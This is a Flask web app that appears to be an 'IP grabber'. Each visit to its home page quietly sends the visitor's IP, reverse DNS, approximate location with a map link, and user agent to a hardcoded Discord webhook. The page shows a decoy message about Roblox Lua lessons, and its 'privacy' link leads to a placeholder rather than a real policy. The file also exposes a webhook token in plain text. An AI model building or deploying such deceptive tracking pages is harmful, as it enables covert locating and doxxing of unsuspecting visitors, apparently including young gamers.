import os
import requests
import socket
from flask import Flask, request, render_template_string

app = Flask(__name__)

# Set this in your host's environment variables, not in the code.
WEBHOOK_URL = "https://discord.com/api/webhooks/1522994693468848188/zlfm2886YfqZBHwaqB9EAfbfZKfXtS7SdPJ21WA0cbzAcgp5GLp4nO1tllYYaEfcfdyq"

def get_visitor_ip():
    # When hosted behind a proxy/load balancer, the real IP is in X-Forwarded-For.
    fwd = request.headers.get("X-Forwarded-For", "")
    if fwd:
        return fwd.split(",")[0].strip()
    return request.remote_addr

def get_geolocation(ip):
    # Uses the free ip-api.com service (no key). City/region-level only.
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        data = r.json()
        if data.get("status") == "success":
            city = data.get("city", "?")
            region = data.get("regionName", "?")
            country = data.get("country", "?")
            lat = data.get("lat")
            lon = data.get("lon")
            maps_link = f"https://www.google.com/maps?q={lat},{lon}"
            return f"{city}, {region}, {country}", maps_link
        return "unknown location", "no map"
    except requests.RequestException:
        return "lookup failed", "no map"

def get_reverse_dns(ip):
    try:
       return socket.gethostbyaddr(ip)[0]
    except (socket.herror, socket.gaierror):
       return "no reverse DNS"

def log_to_discord(ip, rdns, location, maps_link, path, user_agent):  
    payload = {
        "content": (
            f"**New visit**\n"
            f"IP: `{ip}`\n"
            f"Reverse DNS: `{rdns}`\n"
            f"Approx. location: {location}\n"
            f"Map: {maps_link}\n"
            f"Path: `{path}`\n"
            f"User-Agent: `{user_agent}`"
        )
    }
    try:
        r = requests.post(WEBHOOK_URL, json=payload, timeout=5)
        if r.status_code not in (200, 204):
            print(f"Discord webhook failed: {r.status_code} {r.text}")
    except requests.RequestException as e:
        print(f"Discord webhook error: {e}")

@app.route("/")
def home():
    ip = get_visitor_ip()
    rdns = get_reverse_dns(ip)
    location, maps_link = get_geolocation(ip)
    log_to_discord(ip, rdns, location, maps_link, request.path, request.headers.get("User-Agent", "unknown"))
    return render_template_string("""
        <h1>Welcome</h1>
        <p>Thanks for visiting.</p>
        <p style="font-size:0.8em;color:#666;">
          This site will redirect you to lessons on learning roblox lua.
          See our <a href="/privacy">Website</a>.
        </p>
    """)

@app.route("/privacy")
def privacy():
    # Paste your existing policy here (or serve it from a template/file).
    return "<h1>Lua</h1><p>The Website is still in its early stages of development.</p>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
